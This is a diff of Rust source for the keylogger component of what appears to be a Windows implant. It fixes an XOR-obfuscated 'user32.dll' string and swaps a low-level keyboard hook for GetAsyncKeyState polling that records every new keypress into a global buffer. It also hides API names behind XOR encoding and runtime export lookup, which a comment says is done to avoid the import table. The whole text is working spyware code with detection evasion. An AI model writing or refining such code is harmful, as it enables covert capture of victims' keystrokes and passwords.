@@ -818,78 +818,37 @@ fn keylog_thread() {
     use std::sync::atomic::Ordering;
 
     let user32 = crate::loader::get_module_base(
-        crate::obfs::dec(&[0x2F,0x3F,0x28,0x3F,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
+        crate::obfs::dec(&[0x2F,0x29,0x3F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
     );
     if user32 == 0 { return; }
 
-    // "SetWindowsHookExW\0" XOR 0x5A
-    let p_set  = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x09,0x3F,0x2E,0x0D,0x33,0x34,0x3E,0x35,0x2D,0x29,0x12,0x35,0x35,0x31,0x1F,0x22,0x0D,0x5A]).as_ptr()) };
-    let p_get  = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x1D,0x3F,0x2E,0x17,0x3F,0x29,0x29,0x3B,0x3D,0x3F,0x0D,0x5A]).as_ptr()) }; // GetMessageW
-    let p_disp = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x1E,0x33,0x29,0x2A,0x3B,0x2E,0x39,0x12,0x37,0x3F,0x29,0x29,0x3B,0x3D,0x3F,0x0D,0x5A]).as_ptr()) }; // DispatchMessageW
-    let p_unhk = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x0F,0x34,0x32,0x35,0x35,0x31,0x0D,0x33,0x34,0x3E,0x35,0x2D,0x29,0x12,0x35,0x35,0x31,0x1F,0x22,0x5A]).as_ptr()) };
+    // "GetAsyncKeyState\0" XOR 0x5A
+    let p_gas = unsafe { crate::loader::get_export_by_name(user32,
+        crate::obfs::dec(&[0x1D,0x3F,0x2E,0x1B,0x29,0x23,0x34,0x39,0x11,0x3F,0x23,0x09,0x2E,0x3B,0x2E,0x3F,0x5A]).as_ptr()) };
+    let p_gas = match p_gas { Some(p) => p, None => return };
 
-    type SetHookFn = unsafe extern "system" fn(i32, *const u8, isize, u32) -> isize;
-    type GetMsgFn  = unsafe extern "system" fn(*mut [u8;48], isize, u32, u32) -> i32;
-    type DispFn    = unsafe extern "system" fn(*const [u8;48]) -> isize;
-    type UnhookFn  = unsafe extern "system" fn(isize) -> i32;
+    type GetAsyncKeyStateFn = unsafe extern "system" fn(i32) -> i16;
+    let fn_gas: GetAsyncKeyStateFn = unsafe { core::mem::transmute(p_gas) };
 
-    let (fn_set, fn_get, fn_disp, fn_unhook) = match (p_set, p_get, p_disp, p_unhk) {
-        (Some(a), Some(b), Some(c), Some(d)) => (
-            unsafe { core::mem::transmute::<_, SetHookFn>(a) },
-            unsafe { core::mem::transmute::<_, GetMsgFn>(b) },
-            unsafe { core::mem::transmute::<_, DispFn>(c) },
-            unsafe { core::mem::transmute::<_, UnhookFn>(d) },
-        ),
-        _ => return,
-    };
+    KEYLOG_HOOK.store(1, Ordering::SeqCst);
 
-    const WH_KEYBOARD_LL: i32 = 13;
-    let hook = unsafe { fn_set(WH_KEYBOARD_LL, keylog_proc as *const u8, 0, 0) };
-    if hook == 0 { return; }
-    KEYLOG_HOOK.store(hook as usize, Ordering::SeqCst);
-
-    // Message pump
-    let mut msg = [0u8; 48];
+    let mut prev = [false; 256];
     while KEYLOG_HOOK.load(Ordering::SeqCst) != 0 {
-        let r = unsafe { fn_get(&mut msg, 0, 0, 0) };
-        if r <= 0 { break; }
-        unsafe { fn_disp(&msg) };
-    }
-    unsafe { fn_unhook(hook) };
-    KEYLOG_HOOK.store(0, Ordering::SeqCst);
-}
-
-unsafe extern "system" fn keylog_proc(code: i32, wparam: usize, lparam: isize) -> isize {
-    use std::sync::atomic::Ordering;
-    const WM_KEYDOWN: usize = 0x0100;
-    const HC_ACTION: i32 = 0;
-
-    if code == HC_ACTION && (wparam == WM_KEYDOWN) {
-        // lparam points to KBDLLHOOKSTRUCT: vkCode(u32), scanCode(u32), flags(u32), time(u32), dwExtraInfo(usize)
-        let vk = unsafe { *(lparam as *const u32) };
-        let ch = vk_to_char(vk);
-        if !ch.is_empty() {
-            // Spin lock
-            while KEYLOG_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {}
-            KEYLOG_BUF.extend_from_slice(ch.as_bytes());
-            KEYLOG_LOCK.store(false, Ordering::Release);
+        for vk in 0u32..=254 {
+            let state = unsafe { fn_gas(vk as i32) } as u16;
+            let pressed = state & 0x8000 != 0;
+            if pressed && !prev[vk as usize] {
+                let ch = vk_to_char(vk);
+                if !ch.is_empty() {
+                    while KEYLOG_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {}
+                    unsafe { KEYLOG_BUF.extend_from_slice(ch.as_bytes()); }
+                    KEYLOG_LOCK.store(false, Ordering::Release);
+                }
+            }
+            prev[vk as usize] = pressed;
         }
+        std::thread::sleep(std::time::Duration::from_millis(10));
     }
-
-    // CallNextHookEx — resolve at runtime to avoid IAT
-    let user32 = crate::loader::get_module_base(
-        crate::obfs::dec(&[0x2F,0x3F,0x28,0x3F,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
-    );
-    if user32 != 0 {
-        let p = crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x19,0x3B,0x36,0x36,0x14,0x3F,0x22,0x2E,0x12,0x35,0x35,0x31,0x1F,0x22,0x5A]).as_ptr());
-        if let Some(p) = p {
-            type CallNextFn = unsafe extern "system" fn(isize, i32, usize, isize) -> isize;
-            let f: CallNextFn = core::mem::transmute(p);
-            let hook = KEYLOG_HOOK.load(Ordering::SeqCst) as isize;
-            return f(hook, code, wparam, lparam);
-        }
-    }
-    0
 }
 
 fn vk_to_char(vk: u32) -> &'static str {
